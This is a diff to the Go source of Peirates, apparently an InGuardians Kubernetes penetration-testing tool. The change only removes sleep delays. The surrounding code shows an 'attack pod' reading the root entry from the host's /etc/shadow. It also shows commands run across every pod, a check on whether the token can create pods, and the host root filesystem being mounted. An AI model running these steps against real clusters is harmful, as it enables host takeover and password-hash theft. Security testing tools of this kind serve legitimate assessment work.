@@ -474,7 +474,6 @@ spec:
 	} else {
 		attackPodName := "attack-pod-" + randomString
 		println("Executing code in " + attackPodName + " to get its underlying host's root password hash")
-		time.Sleep(2 * time.Second)
 		shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		if err != nil {
 			log.Fatal(err)
@@ -538,7 +537,6 @@ func PeiratesMain() {
 
 	println("\n\nPeirates v1.01 by InGuardians")
 	println("https://www.inguardians.com/labs/\n")
-	time.Sleep(2 * time.Second)
 	parseOptions(&cmdOpts)
 
 	if inAPod(connectionString) {
@@ -550,19 +548,14 @@ func PeiratesMain() {
 	allPods := getPodList(connectionString)
 
 	GetRoles(connectionString, &kubeRoles)
-	time.Sleep(5 * time.Second)
 	GetPodsInfo(connectionString, &podInfo)
-	time.Sleep(5 * time.Second)
 	GetHostMountPoints(podInfo)
-	time.Sleep(5 * time.Second)
 	GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
-	time.Sleep(5 * time.Second)
 	for _, pod := range allPods {
 		// JAY / TODO: Put me back
 		println("Running a hostname command in pod: " + pod)
 		print(getHostname(connectionString, pod))
 	}
-	time.Sleep(5 * time.Second)
 	if cmdOpts.commandToRunInPods != "" {
 		if len(cmdOpts.podsToRunTheCommandIn) > 0 {
 			execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
@@ -570,14 +563,12 @@ func PeiratesMain() {
 			execInAllPods(connectionString, cmdOpts.commandToRunInPods)
 		}
 	}
-	time.Sleep(5 * time.Second)
 	podCreation := canCreatePods(connectionString)
 	if podCreation {
 		println("+ This token can create pods on the cluster")
 	} else {
 		println(" This token cannot create pods on the cluster")
 	}
-	time.Sleep(5 * time.Second)
 	MountRootFS(allPods, connectionString)
 
 }
